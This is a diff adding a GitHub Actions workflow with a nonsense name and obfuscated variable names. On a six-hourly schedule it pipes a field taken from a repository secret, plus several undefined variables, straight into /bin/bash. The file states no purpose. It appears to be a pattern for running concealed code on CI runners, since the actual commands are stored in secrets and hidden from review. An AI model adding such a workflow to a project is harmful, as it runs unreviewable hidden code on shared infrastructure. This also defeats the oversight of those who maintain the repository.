@@ -1,0 +1,22 @@
+name: huozhejiushiyiyii
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '5 1/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: huozhejiushiyiyii
+        env:
+          ynnnh93: ${{ secrets.ynnnh93 }}
+        run: |
+          echo $ynnnh93 | jq -r .cqh6 | /bin/bash
+          echo $tfun4216 | jq -r .vaeg278 | /bin/bash
+          echo $ot02473 | jq -r .bjxhv8831 | /bin/bash
+          echo $nju74644 | jq -r .y86618 | /bin/bash
+
